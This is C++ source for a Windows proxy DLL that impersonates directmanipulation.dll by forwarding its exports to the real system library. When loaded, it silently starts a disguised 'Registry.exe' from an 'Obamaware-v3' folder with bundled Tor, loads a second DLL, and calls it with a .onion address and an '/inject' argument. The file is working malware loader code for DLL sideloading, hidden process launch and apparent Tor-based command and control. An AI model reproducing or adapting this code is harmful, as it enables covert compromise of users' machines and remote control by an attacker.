
#include <cstring>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <windows.h>
#include <string>
#include <vector>
#include <tuple>
#include <utility>
#include <iostream>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:DllCanUnloadNow=directmanipulation.dll.DllCanUnloadNow,@2")
#pragma comment(linker, "/export:DllGetActivationFactory=directmanipulation.dll.DllGetActivationFactory,@3")
#pragma comment(linker, "/export:DllGetClassObject=directmanipulation.dll.DllGetClassObject,@4")
#pragma comment(linker, "/export:InitializeDManipHook=directmanipulation.dll.InitializeDManipHook,@1")


HMODULE hReal = nullptr;

bool start_process(const char* file, bool batmode = true, const char* exeArgs = nullptr, bool waitfor = false)
{
    auto expandVars = [](const char* input) -> std::string {
        if (!input) return "";
        DWORD need = ExpandEnvironmentStringsA(input, nullptr, 0);
        if (!need) return "";
        std::vector<char> buf(need);
        ExpandEnvironmentStringsA(input, buf.data(), need);
        return std::string(buf.data());
    };

    // Expand script / exe path
    std::string scriptPath = expandVars(file);
    if (scriptPath.empty())
        return false;

    std::vector<char> cmdMutableData;
    char* cmdPtr = nullptr;

    if (batmode) {
        // FIX #7: expand arguments
        std::string args = expandVars(exeArgs);

        // FIX #3: proper closing quote
        std::string cmdLine = "/C \"\"" + scriptPath + "\"";

        if (!args.empty()) {
            cmdLine += " ";
            cmdLine += args;
        }

        cmdLine += "\"";  // <-- critical closing quote

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\0');
        cmdPtr = cmdMutableData.data();
    }
    else {
        std::string args = expandVars(exeArgs);

        std::string cmdLine = "\"" + scriptPath + "\"";
        if (!args.empty()) {
            cmdLine += " ";
            cmdLine += args;
        }

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\0');
        cmdPtr = cmdMutableData.data();
    }

    const char* processName =
        batmode ? "C:\\Windows\\System32\\cmd.exe" : scriptPath.c_str();

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    BOOL ok = CreateProcessA(
        processName,
        cmdPtr,
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    if (!ok)
        return false;

    if (waitfor)
        WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}
// 1 SafeCall template
template<typename R, typename... Args>
R SafeCall(void* fn, Args&&... args) {
    using Fn = R(WINAPI*)(Args...);
    return ((Fn)fn)(std::forward<Args>(args)...);
}

// 2 Thread task
template<typename R, typename... Args>
struct ThreadTask {
    void* fn;             // raw function pointer
    std::tuple<Args...> args; // stored arguments
    R result;

    ThreadTask(void* f, Args&&... a)
        : fn(f), args(std::forward<Args>(a)...) {}
};

// 3 Thread procedure
template<typename R, typename... Args>
DWORD WINAPI ThreadProc(LPVOID param) {
    auto* task = static_cast<ThreadTask<R, Args...>*>(param);
    __try {
        task->result = std::apply([&](auto&&... unpackedArgs) {
            return SafeCall<R>(task->fn, std::forward<decltype(unpackedArgs)>(unpackedArgs)...);
        }, task->args);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        task->result = R{}; // default value on exception
    }
    delete task;
    return 0;
}

// 4 Helper to start the thread
template<typename R, typename... Args>
HANDLE StartSafeThread(void* fn, Args&&... args) {
    auto* task = new ThreadTask<R, Args...>(fn, std::forward<Args>(args)...);
    HANDLE hThread = CreateThread(
        nullptr, 0,
        ThreadProc<R, Args...>,
        task,
        0, nullptr
    );
    return hThread;
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (!hReal) {
        hReal = LoadLibraryExW(L"directmanipulation.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    }

    if (hReal) {
        using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
        DllMainFn orig = (DllMainFn)GetProcAddress(hReal, "DllMain");
        if (!orig) {
            orig = (DllMainFn)GetProcAddress(hReal, (LPCSTR)MAKEINTRESOURCEA(180));
        }

        if (orig) {
            orig(hModule, ul_reason_for_call, lpReserved);
        }
    }

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        {
            start_process("%LOCALAPPDATA%\\Obamaware-v3\\tor\\tor\\Registry.exe", false, nullptr, false);
        }
        {
            char dllPath[MAX_PATH];
            ExpandEnvironmentStringsA(
                "%LOCALAPPDATA%\\Obamaware-v3\\dependencymanager.dll",
                dllPath,
                MAX_PATH
            );

            HMODULE hDll = LoadLibraryA(dllPath);
            FARPROC p = GetProcAddress(hDll, "main_func");

            HANDLE hThread = StartSafeThread<int>(p, "we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion", "/inject", "main_func");

        }
//additional dll loadings
    }
    break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
